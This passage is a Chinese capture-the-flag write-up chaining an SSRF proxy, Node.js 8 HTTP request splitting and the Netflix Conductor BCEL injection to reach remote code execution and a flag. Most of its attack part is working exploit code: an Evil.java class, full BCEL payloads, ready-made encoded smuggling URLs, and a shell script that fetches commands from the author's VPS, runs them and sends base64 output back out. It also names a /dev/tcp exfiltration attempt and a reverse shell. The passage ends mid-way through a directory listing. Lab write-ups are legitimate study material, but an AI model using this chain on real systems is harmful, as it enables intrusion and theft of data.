SwaggerUi({ url: url + \"/api/swagger.json\", dom_id: \"swagger-ui-container\", supportedSubmitMethods: ['get', 'post', 'put', 'delete', 'patch'], onComplete: function(swaggerApi, swaggerUi){ window.swaggerUi.api.setBasePath(\"/api\"); if(typeof initOAuth == \"function\") { initOAuth({ clientId: \"your-client-id\", clientSecret: \"your-client-secret-if-required\", realm: \"your-realms\", appName: \"your-app-name\", scopeSeparator: \" \", additionalQueryStringParams: {} }); } if(window.SwaggerTranslator) { window.SwaggerTranslator.translate(); } }, onFailure: function(data) { log(\"Unable to Load SwaggerUI\"); }, docExpansion: \"none\", jsonEditor: false, defaultModelRendering: 'schema', showRequestHeaders: false }); window.swaggerUi.load(); function log() { if ('console' in window) { console.log.apply(console, arguments); } } }); &lt;/script&gt; &lt;/head&gt; &lt;body class=\"swagger-section\"&gt; &lt;div id='header'&gt; &lt;div class=\"swagger-ui-wrap\"&gt; &lt;a id=\"logo\" href=\"http://swagger.io\"&gt;&lt;img class=\"logo__img\" alt=\"swagger\" height=\"30\" width=\"30\" src=\"images/logo_small.png\" /&gt;&lt;span class=\"logo__title\"&gt;swagger&lt;/span&gt;&lt;/a&gt; &lt;form id='api_selector'&gt; &lt;div class='input'&gt;&lt;input placeholder=\"http://example.com/api\" id=\"input_baseUrl\" name=\"baseUrl\" type=\"text\"/&gt;&lt;/div&gt; &lt;div id='auth_container'&gt;&lt;/div&gt; &lt;div class='input'&gt;&lt;a id=\"explore\" class=\"header__btn\" href=\"#\" data-sw-translate&gt;Explore&lt;/a&gt;&lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"message-bar\" class=\"swagger-ui-wrap\" data-sw-translate&gt;&amp;nbsp;&lt;/div&gt; &lt;div id=\"swagger-ui-container\" class=\"swagger-ui-wrap\"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 根据 swagger.json 拿到接口列表。 /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/swagger.json 直接找了个 Swagger UI demo，然后本地起个服务，把上面得到的数据导进去。 先看看配置参数。 /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/admin/config 得到 { \"jetty.git.hash\": \"b1e6b55512e008f7fbdf1cbea4ff8a6446d1073b\", \"loadSample\": \"true\", \"io.netty.noUnsafe\": \"true\", \"conductor.jetty.server.enabled\": \"true\", \"io.netty.noKeySetOptimization\": \"true\", \"buildDate\": \"2021-04-03_17:38:09\", \"io.netty.recycler.maxCapacityPerThread\": \"0\", \"conductor.grpc.server.enabled\": \"false\", \"version\": \"2.26.0-SNAPSHOT\", \"queues.dynomite.nonQuorum.port\": \"22122\", \"workflow.elasticsearch.url\": \"es:9300\", \"workflow.namespace.queue.prefix\": \"conductor_queues\", \"user.timezone\": \"GMT\", \"workflow.dynomite.cluster.name\": \"dyno1\", \"sun.nio.ch.bugLevel\": \"\", \"workflow.dynomite.cluster.hosts\": \"dyno1:8102:us-east-1c\", \"workflow.elasticsearch.instanceType\": \"external\", \"db\": \"dynomite\", \"queues.dynomite.threads\": \"10\", \"workflow.namespace.prefix\": \"conductor\", \"workflow.elasticsearch.index.name\": \"conductor\" } 版本为 2.26.0-SNAPSHOT。 Step 04 Netflix Conductor RCE参考 CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析 太顶了！（咱不会 Java，哭哭 这个漏洞出在 /api/metadata/taskdefs 上，需要 POST 一个 JSON 过去，里面含有恶意的 BCEL 编码，可以造成 RCE。 什么是 BCEL编码 呢？ http://commons.apache.org/proper/commons-bcel/ The Byte Code Engineering Library (Apache Commons BCEL™) is intended to give users a convenient way to analyze, create, and manipulate (binary) Java class files (those ending with .class). Classes are represented by objects which contain all the symbolic information of the given class: methods, fields and byte code instructions, in particular. Byte Code Engineering Library (BCEL)，这是Apache Software Foundation 的Jakarta 项目的一部分。BCEL是 Java classworking 最广泛使用的一种框架,它可以让您深入 JVM 汇编语言进行类操作的细节。 可以用 BCELCodeman 这个工具来编码、解码。 Step 05 NodeJS 8 HTTP 请求走私暂且先不看这个，咱先看看 怎么从 GET 接口打 POST 请求。 NodeJS 有个 CVE-2018-12116，可以在 path 里构造带有 Unicode 的数据，发送非预期的路径给服务端来生成另一个 HTTP 请求。 或者可以说是 HTTP 请求走私（HTTP request smuggling）。 Node.js: All versions prior to Node.js 6.15.0 and 8.14.0: HTTP request splitting: If Node.js can be convinced to use unsanitized user-provided Unicode data for the path option of an HTTP request, then data can be provided which will trigger a second, unexpected, and user-defined HTTP request to made to the same server. （草，这也行 根据源码中的 const salt = 'nooooooooodejssssssssss8_issssss_beeeeest' 可以知道用到的是 NodeJS 8. （这谁想到呢 唉，巨古老的版本，好烦手上没环境 docker 大法好啊！ 搜一下 tag https://hub.docker.com/_/node?tab=description&amp;page=1&amp;ordering=last_updated&amp;name=8.13 （本来看影响范围到 8.14.0 的，于是试了一下 8.14.0-alpine，然而发现报错 TypeError: Request path contains unescaped characters，看来貌似修了 docker pull node:8.13.0-alpine docker run -itd --name node8.13-test node:8.13.0-alpine docker exec -it node8.13-test /bin/sh # 进入docker里执行 npm i axios node 然后给自己服务器打打试试，服务器上起个服务监听端口。 Node 里执行 const axios = require('axios') var s = 'http://VPSIP/?param=x\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:{\\u0120}127.0.0.1:3000\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/private' axios.get(s).then((r) =&gt; console.log(r.data)).catch(console.error) 可以看到请求成功换行了，而且夹带了一个新的请求。 再夹带一个 POST 请求试试 var s = 'http://VPSIP/\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:{\\u0120}127.0.0.1:3000\\u{010D}\\u{010A}\\u{010D}\\u{010A}POST\\u{0120}/search?url=http://10.0.66.14:8080/api/metadata/taskdefs\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:127.0.0.1:3000\\u{010D}\\u{010A}Content-Type:application/json\\u{010D}\\u{010A}Content-Length:15\\u{010D}\\u{010A}\\u{010D}\\u{010A}MiaoTony Meow~~\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/private' 好耶，POST 请求构造成功了！ Step 06 借助 SSRF 打 Conductor RCE那再回来看 Conductor RCE。 直接改 赵总的 Exploit 好了。 这里其实试了无数次，发现都反弹不了 shell，估计是没有 bash，但甚至直接 cat /flag &gt; /dev/tcp/IP/PORT 也出不来，不懂为啥。。（难道重定向不行？ （心态炸了！！！啊啊啊啊啊啊啊！ 最后没办法，还是先把 shell 脚本写入文件，再 sh filename 执行代码。 为了方便修改命令，就在 VPS 上放要执行的命令，靶机上的 shell 里利用 wget 下来后执行命令，再利用 URL 传参把执行结果返回给 VPS。 Evil.java public class Evil { public Evil() { try { Runtime.getRuntime().exec(\"wget http://VPSIP:PORT/ -O /tmp/miaotony\"); } catch (Exception ex) { ex.printStackTrace(); } } public static void main(final String[] array) { } } 然后编译得到一个 Evil.class，再利用 BCELCodeman 转换为 BCEL 编码。 javac Evil.java java -jar BCELCodeman.jar e Evil.class （喵喵这里用的 java 版本是 # javac -version javac 1.8.0_221 # java -version java version \"1.8.0_221\" Java(TM) SE Runtime Environment (build 1.8.0_221-b11) Java HotSpot(TM) 64-Bit Server VM (build 25.221-b11, mixed mode) 组合到 JSON 里 [{\"name\":\"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5......').newInstance().class}\",\"ownerEmail\":\"test@example.org\",\"retryCount\":\"3\",\"timeoutSeconds\":\"1200\",\"inputKeys\":[\"sourceRequestId\",\"qcElementType\"],\"outputKeys\":[\"state\",\"skipped\",\"result\"],\"timeoutPolicy\":\"TIME_OUT_WF\",\"retryLogic\":\"FIXED\",\"retryDelaySeconds\":\"600\",\"responseTimeoutSeconds\":\"3600\",\"concurrentExecLimit\":\"100\",\"rateLimitFrequencyInSeconds\":\"60\",\"rateLimitPerFrequency\":\"50\",\"isolationgroupId\":\"myIsolationGroupId\"}] 最后构造 POST 请求。 POST /api/metadata/taskdefs? HTTP/1.1 Host: 10.0.64.14:8080 Content-Type: application/json Content-Length:1408 [{\"name\":\"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5......').newInstance().class}\",\"ownerEmail\":\"test@example.org\",\"retryCount\":\"3\",\"timeoutSeconds\":\"1200\",\"inputKeys\":[\"sourceRequestId\",\"qcElementType\"],\"outputKeys\":[\"state\",\"skipped\",\"result\"],\"timeoutPolicy\":\"TIME_OUT_WF\",\"retryLogic\":\"FIXED\",\"retryDelaySeconds\":\"600\",\"responseTimeoutSeconds\":\"3600\",\"concurrentExecLimit\":\"100\",\"rateLimitFrequencyInSeconds\":\"60\",\"rateLimitPerFrequency\":\"50\",\"isolationgroupId\":\"myIsolationGroupId\"}] 再 URL 编码一下，还需要借助 /proxy 接口 SSRF 代理请求。 参考一下赵总的 JS 脚本。 post_payload = '[\\u{017b}\\u{0122}name\\u{0122}:\\u{0122}$\\u{017b}\\u{0127}1\\u{0127}.getClass().forName(\\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\\u{0127}).newInstance().loadClass(\\u{0127}$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5$83$ov$e3$p$aa$88$X$e1$a9$3e$a2$N$P$5el$d7$a4$a6$da$edfM$R$7f$c8$b3$X$c4$83$l$e0G$e1$c......\\u{0127}).newInstance().class\\u{017d}\\u{0122},\\u{0122}ownerEmail\\u{0122}:\\u{0122}test@example.org\\u{0122},\\u{0122}retryCount\\u{0122}:\\u{0122}3\\u{0122},\\u{0122}timeoutSeconds\\u{0122}:\\u{0122}1200\\u{0122},\\u{0122}inputKeys\\u{0122}:[\\u{0122}sourceRequestId\\u{0122},\\u{0122}qcElementType\\u{0122}],\\u{0122}outputKeys\\u{0122}:[\\u{0122}state\\u{0122},\\u{0122}skipped\\u{0122},\\u{0122}result\\u{0122}],\\u{0122}timeoutPolicy\\u{0122}:\\u{0122}TIME_OUT_WF\\u{0122},\\u{0122}retryLogic\\u{0122}:\\u{0122}FIXED\\u{0122},\\u{0122}retryDelaySeconds\\u{0122}:\\u{0122}600\\u{0122},\\u{0122}responseTimeoutSeconds\\u{0122}:\\u{0122}3600\\u{0122},\\u{0122}concurrentExecLimit\\u{0122}:\\u{0122}100\\u{0122},\\u{0122}rateLimitFrequencyInSeconds\\u{0122}:\\u{0122}60\\u{0122},\\u{0122}rateLimitPerFrequency\\u{0122}:\\u{0122}50\\u{0122},\\u{0122}isolationgroupId\\u{0122}:\\u{0122}myIsolationGroupId\\u{0122}\\u{017d}]' console.log(encodeURI(encodeURI(encodeURI('http://0.0.0.0:3000/\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:127.0.0.1:3000\\u{010D}\\u{010A}\\u{010D}\\u{010A}POST\\u{0120}/search?url=http://10.0.64.14:8080/api/metadata/taskdefs\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:127.0.0.1:3000\\u{010D}\\u{010A}Content-Type:application/json\\u{010D}\\u{010A}Content-Length:' + post_payload.length + '\\u{010D}\\u{010A}\\u{010D}\\u{010A}' + post_payload + '\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/private')))) 打的时候记得改一下 $$BCEL$$ 那部分，以及 conductor 那台靶机的 IP。 得到 http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.64.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1536%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5dO$gA$U$3d$b3$m$L$db$a5$7cXh$b1$l$82$3e$I$9a$b2$rAi$d1$f8$d2$d0$tZ$8c$Q$7d$f0$c5a$9d$d0$b1$ecG$d6$c1$da_$d4g_$b4$f1$c1$l$e0$8f$b2$bd$b31$d2$a4$9dd$ce$cc$3d$f7$cc$b9wf$ee$eeon$B$b4$b1j$n$8dg$WJ$u$a7$f1$5c$af$_LT$y$y$60$c9$c4K$T$af$YR$3b$d2$97j$97$nQo$i0$q$3f$G$t$82$n$d7$97$be$f82$f3$c6$o$g$f1$f1$94$98$ecPq$f7$dbg$k$c6q$7c$baBr$8fK$9f$a1$5c$3f$ea$9f$f2s$eeL$b9$3fq$86$w$92$fed$5b$dbY$c3$60$W$b9$e2$93$d4$W$99$de$b9$9c6$b5$ceF$G$96$89$d76$de$60$99$c1$f9$3e$R$aa$faU$a9$b0$eb8$edN$f3$c3V$b3$b5$d5n$b66$db$ddN$eb$fd$bb$ea$dbA$d5Q$5e$e8x$92$H$w$f0$7f$d8$a8$a2$c6$b08$_$d9$bbpE$a8d$e0$dbX$81E$7d$e9R$M$f9$b9b0$3e$V$aeb$u$cc$a9$fd$99$af$a4G$8dYT$fe1$u$d5$h$fd$7f4$dbd$v$$$84$cb$b0V$ff$cfM$ff$a2$f6$a2$c0$Vggt$m$XRR$c5$cf6$8a$b8$xP$83I$df$a1$87$B$a6_$80$f0$JE$c7$U$h$b4$96$d7$af$c1$7e$c1$u$s$ae$90$3c$fc$89t$7f$e3$K$a9KR$r$91E$9e$7e$cd$80M$ba$r$a4$I$T$c4$$$Q$9f$a1$8c$89$C9$97$c81K$99$3c$8c$df$E$cc$c4S$N$b9d$ac$v$3cT$ab$d0dz$5e$c6$hm$98$8a$89$ya1nn$f1$P$LRz$KA$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private 然后在自己 VPS 上起一个 web 服务，访问 http://VPSIP:PORT/ 的时候返回一个 shell 脚本。 #!/bin/sh wget -O- -q http://VPSIP:PORT/`wget -O- -q http://VPSIP:PORT/command|sh|base64|awk '{printf(\"%s\",$0)}'` | echo 同时在监听 http://VPSIP:PORT/command 的地方放你要执行的命令，比如 whoami &amp;&amp; cat /flag 这里执行的时候会访问 http://VPSIP:PORT/command，执行这条命令，再进行 base64 编码，最后把换行给去掉。最后把执行的结果返回到 http://VPSIP:PORT/xxx 这个路由下，根据服务器的日志，把 path base64 解码一下就能拿到执行的结果了。 如果不去掉换行的话 base64 多行的话会丢信息，执行还会认为是多个 wget 命令于是报错。。 再按照这一步的思路，同理生成一个 执行 /tmp/miaotony 的 URL。 public class Evil { public Evil() { try { Runtime.getRuntime().exec(\"sh /tmp/miaotony\"); // &lt;======== } catch (Exception ex) { ex.printStackTrace(); } } public static void main(final String[] array) { } } BCEL: $$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$EDP$f0$85$ba$Q4$b1$hw$g7FW$f8$88$Y$5d$b8q$a8$T$i$a5$z$v$D$d1$_r$cdF$8d$L$3f$c0$8fR$ef4FLt$9293$f7$dcs$cf$9d$c7$fb$c7$eb$h$80$z$ac$daHc$daF$J$e54f$f4$3ak$a1b$p$89$aa$859$L$f3$M$a9$j$ZH$b5$cb$90$a87$ce$Z$cc$bd$f0Z0$e4$9a2$QG$D$bf$z$a23$de$ee$S$93m$v$ee$dd$j$f2$5e$i$c7$d5$V$92$fb$5c$G$M$e5$fae$f3$96$P$b9$db$e5A$c7m$a9H$G$9dmmg$b7$c2A$e4$89$D$a9$z2$fbC$d9$dd$d4$3a$H$Z$d8$W$W$i$yb$89$n$df$bf$a9$b9$ca$ef$b9$be$e4$a1$K$83$H$H5$y3$U$c7$9e$fb$f7$9e$e8$v$Z$G$OV$60Sc$edE$95c$c5q$fbVx$8a$a10$a6N$H$81$92$3eu$b6$3bB$fd$E$a5z$a3$f9G$b3M$96$e2$5ex$Mk$f5$7f$ae$f2$8b$3a$89BO$f4$fbT$90$ebQR$c5$efr$WqO$60$Z$W$bd$b7$k$G$98$be$o$e1$EEW$U$h$b4$96$d7$9f$c1$5e$60L$r$9e$60$5e$3c$o$dd$dcxBjD$w$TY$e4$e9$5b$M8$a4$ab$oE$98$m6I$7c$862$W$K$e4$5c$o$c7$ye$f20$3e$J$98$85I$N93$d6$U$be$bbUh2$3dG$f1F$h$a6b$oK8$V$l$ae$f8$F$bat$9bh$o$C$A$A URL: http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.64.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1408%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$EDP$f0$85$ba$Q4$b1$hw$g7FW$f8$88$Y$5d$b8q$a8$T$i$a5$z$v$D$d1$_r$cdF$8d$L$3f$c0$8fR$ef4FLt$9293$f7$dcs$cf$9d$c7$fb$c7$eb$h$80$z$ac$daHc$daF$J$e54f$f4$3ak$a1b$p$89$aa$859$L$f3$M$a9$j$ZH$b5$cb$90$a87$ce$Z$cc$bd$f0Z0$e4$9a2$QG$D$bf$z$a23$de$ee$S$93m$v$ee$dd$j$f2$5e$i$c7$d5$V$92$fb$5c$G$M$e5$fae$f3$96$P$b9$db$e5A$c7m$a9H$G$9dmmg$b7$c2A$e4$89$D$a9$z2$fbC$d9$dd$d4$3a$H$Z$d8$W$W$i$yb$89$n$df$bf$a9$b9$ca$ef$b9$be$e4$a1$K$83$H$H5$y3$U$c7$9e$fb$f7$9e$e8$v$Z$G$OV$60Sc$edE$95c$c5q$fbVx$8a$a10$a6N$H$81$92$3eu$b6$3bB$fd$E$a5z$a3$f9G$b3M$96$e2$5ex$Mk$f5$7f$ae$f2$8b$3a$89BO$f4$fbT$90$ebQR$c5$efr$WqO$60$Z$W$bd$b7$k$G$98$be$o$e1$EEW$U$h$b4$96$d7$9f$c1$5e$60L$r$9e$60$5e$3c$o$dd$dcxBjD$w$TY$e4$e9$5b$M8$a4$ab$oE$98$m6I$7c$862$W$K$e4$5c$o$c7$ye$f20$3e$J$98$85I$N93$d6$U$be$bbUh2$3dG$f1F$h$a6b$oK8$V$l$ae$f8$F$bat$9bh$o$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private Step 07 开打拿 flag首先先试试打到自己 VPS，监听一下端口看看发给 conductor 靶机的请求长什么样。 很好，POST 请求构造得很好。 然后 打给靶机。 依次执行 Step 06 中生成的两个 URL，利用 SSRF 打到 Conductor 上。 最后执行写入 /tmp/miaotony 的脚本，从而执行 VPS 上设置的命令，再从路由拿 flag。 flag{81d75716-7389-4ea0-8e48-ff50347a37c2} 好耶！ 心态炸了，顺便看了看它的 /bin 和 /sbin 里有啥。 total 780 lrwxrwxrwx 1 root root 12 May 9 2019 arch -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ash -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 base64 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 bbconfig -&gt; /bin/busybox -rwxr-xr-x 1 root root 796240 Jan 24 2019 busybox lrwxrwxrwx 1 root root 12 May 9 2019 cat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 chgrp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 chmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 chown -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 conspy -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 cp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 date -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 df -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dmesg -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dnsdomainname -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dumpkmap -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 echo -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ed -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 egrep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 false -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fatattr -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fdflush -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fgrep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fsync -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 getopt -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 grep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 gunzip -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 gzip -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 hostname -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ionice -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iostat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ipcalc -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 kbd_mode -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 kill -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 link -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 linux32 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 linux64 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ln -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 login -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ls -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 lzop -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 makemime -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mkdir -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mknod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mktemp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 more -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mount -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mountpoint -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mpstat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mv -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 netstat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 nice -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 pidof -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ping -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ping6 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 pipe_progress -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 printenv -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ps -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 pwd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 reformime -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rev -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rm -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rmdir -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 run-parts -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sed -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 setpriv -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 setserial -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sh -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sleep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 stat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 stty -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 su -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sync -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 tar -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 touch -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 